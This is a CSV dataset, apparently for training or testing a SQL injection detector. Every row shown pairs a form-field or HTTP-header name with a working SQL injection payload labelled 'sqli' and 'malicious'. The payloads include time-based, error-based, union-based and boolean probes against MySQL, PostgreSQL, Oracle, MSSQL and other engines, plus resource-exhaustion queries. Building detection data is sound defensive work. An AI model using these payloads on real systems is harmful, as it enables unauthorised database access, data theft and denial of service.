payload,type,label
phone: 1)) as emtf where 3561=3561 or (select * from (select(sleep(5)))ydpu)--,sqli,malicious
pwd: 1%') and (select * from (select(sleep(5)))gcrr)#,sqli,malicious
"msg: 1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'hvqt'='hvqt",sqli,malicious
"code: 1' in boolean mode) union all select null,null#",sqli,malicious
User-Agent: 1') or 6793=(select 6793 from pg_sleep(5)) and ('fuvv'='fuvv,sqli,malicious
"lname: 1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""kcxw""=""kcxw",sqli,malicious
"pass: 1'))) union all select null,null#",sqli,malicious
"phonenumber: 1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('tnfm' like 'tnfm",sqli,malicious
password: 1');select pg_sleep(5),sqli,malicious
"User-Agent: 1') as sjmt where 6541=6541 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,malicious
"pwd: 1"" where 8089=8089;iif(5257=5257,1,1/0)",sqli,malicious
"txt: 1%"") and 4595=4595#",sqli,malicious
"User-Agent: 1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""bkrk""=""bkrk",sqli,malicious
"fullname: -3769""))) union all select 8456#",sqli,malicious
"username: 1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,malicious
"fullname: -1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",sqli,malicious
"fname: 1%') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",sqli,malicious
lname: 1%'));if(7899=7899) select 7899 else drop function zbbp--,sqli,malicious
addr: 1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt' like 'sqvt,sqli,malicious
"postal: 1')));select count(*) from generate_series(1,5000000)--",sqli,malicious
"postalcode: 1') where 1212=1212;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
password: 1' where 9416=9416;begin user_lock.sleep(5); end--,sqli,malicious
"lname: 1""))) and 7135=8805#",sqli,malicious
"Accept-Language: 1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""ureu"" like ""ureu",sqli,malicious
"zipcode: 1))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((9255=9255",sqli,malicious
"phonenumber: 1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'='",sqli,malicious
"phone: 1%') union all select null,null,null,null,null#",sqli,malicious
"User-Agent: 1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""egzm""=""egzm",sqli,malicious
"content: 1%'));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,malicious
name: 1')) as vnwn where 8774=8774 and (select * from (select(sleep(5)))gcrr)#,sqli,malicious
msg: 1 where 7038=7038;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,malicious
"Accept-Encoding: 1'+(select 'tjvt' where 2463=2463;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,malicious
zipcode: 1') rlike (select (case when (2671=4485) then 1 else 0x28 end)) and ('ezco' like 'ezco,sqli,malicious
"txt: 1"") as kzuq where 4259=4259;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"username: -9023%""))) union all select 4490,4490,4490#",sqli,malicious
"fname: 1) as attr where 8085=8085 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,malicious
"password: 1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('aatp'='aatp",sqli,malicious
"code: 1"" where 7022=7022;select (case when (7822=4430) then 7822 else 1/(select 0) end)--",sqli,malicious
fname: (select (case when (7018=7018) then 7018 else 7018*(select 7018 from master..sysdatabases) end)),sqli,malicious
"secret: 1 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"email: 1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)-- xsob",sqli,malicious
"username: 1')) as uuuk where 7234=7234 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,malicious
password: 1'))) and 7533=7533 and ((('suzd' like 'suzd,sqli,malicious
"secret: 1')) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"username: 1'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"code: 1"")));select case when 7717=7717 then 1 else null end--",sqli,malicious
"pwd: 1') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"phone: 1' in boolean mode) union all select null,null,null,null,null,null,null--",sqli,malicious
"sodienthoai: 1') union all select null,null,null,null,null,null,null#",sqli,malicious
"addr: 1%"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""%""=""",sqli,malicious
"postal: 1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('ccqs'='ccqs",sqli,malicious
phonenumber: 1'+(select 'iqxn' where 1146=1146 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+',sqli,malicious
"phonenumber: 1%"")));begin user_lock.sleep(5); end and (((""%""=""",sqli,malicious
"postal: -1171' union all select 3958,3958,3958,3958,3958--",sqli,malicious
"Accept-Language: 1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
phonenumber: 1 and 7533=7533# absp,sqli,malicious
"number: 1%' and elt(3114=3114,sleep(5))#",sqli,malicious
"zipcode: 1') as sjij where 8659=8659;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"Accept-Encoding: 1%"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",sqli,malicious
"text: -3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",sqli,malicious
"msg: 1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('%'='",sqli,malicious
"username: -3667%')) union all select 3560,3560,3560--",sqli,malicious
"message: 1%"" and (2850=6610)*6610 and ""%""=""",sqli,malicious
"name: 1"") as eomu where 6599=6599;select * from generate_series(9167,9167,case when (9167=2273) then 1 else 0 end) limit 1--",sqli,malicious
"txt: 1""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""ymhg""=""ymhg",sqli,malicious
"pwd: 1"") as jidc where 6093=6093 and 9198=9198--",sqli,malicious
pass: 1')) as tlsl where 8467=8467;begin user_lock.sleep(5); end--,sqli,malicious
"username: 1"") as ivkw where 4218=4218 union all select null--",sqli,malicious
"pwd: 1%'))) and elt(3114=3114,sleep(5))#",sqli,malicious
"sodienthoai: -7843' where 5986=5986 or make_set(9354=9354,7185)--",sqli,malicious
Content-Type: 1%'));begin user_lock.sleep(5); end--,sqli,malicious
"User-Agent: 1 and make_set(6911=1867,1867)",sqli,malicious
"zipcode: 1) as ktfu where 2637=2637;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,malicious
"address: 1"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""pqsp""=""pqsp",sqli,malicious
"secret: 1"" and 6969=(select 6969 from pg_sleep(5))",sqli,malicious
secret: 1%'))) or (select * from (select(sleep(5)))sddo)#,sqli,malicious
"pass: 1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""jbty"" like ""jbty",sqli,malicious
postal: 1)) as qlkf where 6635=6635;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,malicious
"number: -9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",sqli,malicious
"code: 1')) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,malicious
"password: 1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""zcfa""=""zcfa",sqli,malicious
"postalcode: -6096') where 1316=1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",sqli,malicious
User-Agent: 1' waitfor delay '0:0:5',sqli,malicious
"addr: 1' where 6135=6135;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,malicious
"code: 1"") as drrx where 8633=8633 union all select null,null,null--",sqli,malicious
"phonenumber: 1'||(select 'lstx' from dual where 2972=2972 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",sqli,malicious
"username: 1%""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""%""=""",sqli,malicious
"lname: 1""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"email: 1));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((4142=4142",sqli,malicious
"password: 1"")) as szxa where 1501=1501 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"zip: 1%"")) or sleep(5)#",sqli,malicious
"password: 1') where 6081=6081 union all select null,null,null,null,null,null,null,null,null--",sqli,malicious
email: -9840')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dzlp'='dzlp,sqli,malicious
"msg: -2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",sqli,malicious
"Accept-Language: 1')) union all select null,null,null,null,null,null,null--",sqli,malicious
"address: -9821) as qqrm where 7152=7152 union all select 7152,7152,7152,7152--",sqli,malicious
"zipcode: 1'+(select vvet where 5221=5221 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",sqli,malicious
"number: -9281) where 8363=8363 or make_set(8220=5127,5127)--",sqli,malicious
Accept-Language: 1');(select * from (select(sleep(5)))srmq),sqli,malicious
"zipcode: 1)) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((6659=6659",sqli,malicious
"message: 1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('teng' like 'teng",sqli,malicious
"Accept-Language: -5190%"" or 8298=9306 and ""%""=""",sqli,malicious
email: 1 and (5369=8325)*8325# psze,sqli,malicious
"Content-Type: 1 where 2146=2146 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"addr: 1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'cxor'='cxor",sqli,malicious
"msg: -4222') union all select 9267,9267,9267,9267,9267,9267--",sqli,malicious
postal: 1'))) or 6793=(select 6793 from pg_sleep(5)) and ((('mzqi'='mzqi,sqli,malicious
Accept-Encoding: 1) and (7557=1711)*1711 and (5157=5157,sqli,malicious
"addr: 1))) union all select null,null,null,null,null#",sqli,malicious
"username: -4513""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""gytb""=""gytb",sqli,malicious
"sodienthoai: -2766%')) union all select 4458,4458,4458,4458,4458--",sqli,malicious
sdt: 1' in boolean mode) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))#,sqli,malicious
"text: 1%')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('%'='",sqli,malicious
zip: -4952'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('abso'='abso,sqli,malicious
"txt: -7272"") union all select 9163,9163,9163,9163,9163,9163,9163--",sqli,malicious
Accept-Language: 1' in boolean mode) rlike (select * from (select(sleep(5)))sgvo)#,sqli,malicious
"sdt: 1"" union all select null,null,null,null--",sqli,malicious
"sdt: 1') union all select null,null,null,null,null--",sqli,malicious
Accept-Language: 1') where 2511=2511 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,malicious
"Accept-Encoding: 1' union all select null,null,null,null,null,null,null,null,null--",sqli,malicious
"Accept-Language: 1') where 2090=2090;select count(*) from generate_series(1,5000000)--",sqli,malicious
"secret: 1%'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='",sqli,malicious
"name: 1'+(select 'zirh' where 9054=9054 and 3824=benchmark(5000000,md5(0x76555642)))+'",sqli,malicious
sdt: 1') and (3020=3020)*6703,sqli,malicious
Content-Type: 1 or 6793=(select 6793 from pg_sleep(5))-- fyaq,sqli,malicious
"fname: 1'||(select 'osty' from dual where 6433=6433 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",sqli,malicious
address: -8357')) as henk where 8198=8198 or 2558=9103#,sqli,malicious
"postal: 1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('vcvj'='vcvj",sqli,malicious
"address: 1'||(select 'wcad' from dual where 4262=4262 and elt(3114=3114,sleep(5))#",sqli,malicious
"User-Agent: 1"") where 5698=5698 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,malicious
"name: 1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'tuzl'='tuzl",sqli,malicious
zip: 1') where 9817=9817;begin user_lock.sleep(5); end--,sqli,malicious
"zip: 1""));select * from generate_series(6200,6200,case when (6200=5449) then 1 else 0 end) limit 1--",sqli,malicious
"Content-Type: 1"") as xsgx where 5239=5239 union all select null,null--",sqli,malicious
"txt: 1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'dphz'='dphz",sqli,malicious
name: 1 and 7533=7533-- spzi,sqli,malicious
"Accept-Encoding: 1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",sqli,malicious
"zip: 1%"" or 6793=(select 6793 from pg_sleep(5)) and ""%""=""",sqli,malicious
message: -9657') as ziiq where 7725=7725 or 3038=3038,sqli,malicious
"addr: 1'+(select pepf where 5071=5071 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,malicious
User-Agent: 1')) order by 1#,sqli,malicious
phonenumber: 1)) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5139=5139,sqli,malicious
password: -9522) as lraw where 9472=9472 or (4087=8213)*8213--,sqli,malicious
Content-Type: 1%');begin dbms_lock.sleep(5); end--,sqli,malicious
message: -7659') as bowy where 4835=4835 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,malicious
"fname: -8940"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""vnuo"" like ""vnuo",sqli,malicious
message: 1;waitfor delay '0:0:5'--,sqli,malicious
"text: 1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,malicious
fullname: 1' where 3701=3701 and 2006=2006,sqli,malicious
User-Agent: 1') union all select null#,sqli,malicious
"sdt: 1)) as vycb where 3524=3524 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,malicious
"message: 1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykxz'='ykxz",sqli,malicious
"code: 1%"")) union all select null,null,null,null,null,null,null,null,null,null--",sqli,malicious
"content: 1'||(select 'jscc' from dual where 3266=3266 and elt(4249=4249,7259))||'",sqli,malicious
"txt: 1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""lmjg"" like ""lmjg",sqli,malicious
"phonenumber: 1""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"password: 1' or elt(6272=6272,sleep(5)) and 'wdoi'='wdoi",sqli,malicious
"text: 1"")) as qgwq where 6122=6122;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,malicious
content: 1);begin dbms_lock.sleep(5); end--,sqli,malicious
addr: 1%'))) and 9198=9198--,sqli,malicious
"name: -2247') union all select 1202,1202,1202,1202,1202#",sqli,malicious
"addr: 1""))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""wvlb"" like ""wvlb",sqli,malicious
"text: 1%"" waitfor delay '0:0:5'--",sqli,malicious
password: 1%');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,malicious
"address: 1%') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('%'='",sqli,malicious
"zip: 1""))) and (3020=3020)*6703 and (((""krxy""=""krxy",sqli,malicious
"addr: 1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,malicious
"number: 1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",sqli,malicious
"postalcode: 1%""));select case when 7717=7717 then 1 else null end--",sqli,malicious
postal: 1) as oknr where 3228=3228;(select * from (select(sleep(5)))srmq)--,sqli,malicious
"Accept-Language: 1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,malicious
"postal: 1""))) union all select null,null,null,null,null,null--",sqli,malicious
"sodienthoai: 1"" where 9792=9792 rlike (select * from (select(sleep(5)))vwyq)#",sqli,malicious
lname: 1') as twny where 9580=9580;begin dbms_lock.sleep(5); end--,sqli,malicious
email: -7720)) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((8254=8254,sqli,malicious
"lname: 1%"")) waitfor delay '0:0:5'--",sqli,malicious
"Accept-Encoding: 1"" where 1140=1140 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,malicious
"Accept-Encoding: 1' in boolean mode) union all select null,null,null,null,null,null,null,null#",sqli,malicious
"Accept-Language: 1'+(select biqo where 6046=6046;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"Content-Type: 1%')) and make_set(8403=8403,8899) and (('%'='",sqli,malicious
"addr: -3632' or make_set(9354=9354,7185) and 'lgpy' like 'lgpy",sqli,malicious
"content: 1)) as hgtl where 3864=3864 and elt(3114=3114,sleep(5))#",sqli,malicious
"fname: 1"") as pkkx where 6716=6716 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,malicious
password: -7435') where 6242=6242 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,malicious
"email: 1%"") union all select null,null,null--",sqli,malicious
"phonenumber: 1"")) as tngu where 3644=3644 union all select null--",sqli,malicious
"phonenumber: 1%"") and 7533=7533 and (""%""=""",sqli,malicious
"code: 1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""pmpk"" like ""pmpk",sqli,malicious
message: 1' in boolean mode) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#,sqli,malicious
"User-Agent: 1"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"fullname: -1303' union all select 4840,4840#",sqli,malicious
sodienthoai: -9644)) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5616=5616,sqli,malicious
"email: 1' where 8950=8950 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,malicious
"Content-Type: 1"" union all select null,null,null,null,null--",sqli,malicious
"text: 1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ican' like 'ican",sqli,malicious
"sodienthoai: 1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('bacm'='bacm",sqli,malicious
"phone: 1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('adjc'='adjc",sqli,malicious
msg: 1 where 4985=4985 order by 1#,sqli,malicious
"password: -8790') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('nsze' like 'nsze",sqli,malicious
"email: 1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""mmgx"" like ""mmgx",sqli,malicious
"address: 1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('nlky' like 'nlky",sqli,malicious
"lname: -7107""))) order by 1#",sqli,malicious
"Accept-Language: 1"") as ktnq where 9005=9005;select benchmark(5000000,md5(0x714e4153))#",sqli,malicious
"content: 1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('jueq'='jueq",sqli,malicious
"Accept-Language: 1'))) union all select null,null,null,null--",sqli,malicious
"User-Agent: 1'+(select 'sppw' where 1677=1677 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",sqli,malicious
Content-Type: -8652') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,malicious
User-Agent: 1;select pg_sleep(5)-- ojzt,sqli,malicious
"name: 1"" where 4633=4633 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,malicious
"Content-Type: 1%"" union all select null,null,null,null,null,null#",sqli,malicious
"zipcode: 1))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((1748=1748",sqli,malicious
"zipcode: -2027%"") union all select 2048,2048,2048,2048,2048,2048,2048,2048#",sqli,malicious
"postalcode: 1"")) or 4240=(select 4240 from pg_sleep(5))--",sqli,malicious
"Content-Type: 1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ozef'='ozef",sqli,malicious
"postalcode: 1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""rrbl""=""rrbl",sqli,malicious
Content-Type: -6014')) or (9860=4848)*4848 and (('qtge'='qtge,sqli,malicious
"phone: (select like('abcdefg',upper(hex(randomblob(500000000/2)))))",sqli,malicious
"pass: -3633') where 3513=3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",sqli,malicious
msg: 1;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,malicious
email: 1') as xqbq where 1619=1619 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,malicious
fname: 1' where 8635=8635 order by 1--,sqli,malicious
name: -6036))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((6723=6723,sqli,malicious
"message: 1 union all select null,null,null,null,null,null,null,null,null,null#",sqli,malicious
postal: 1);select sleep(5) and (4863=4863,sqli,malicious
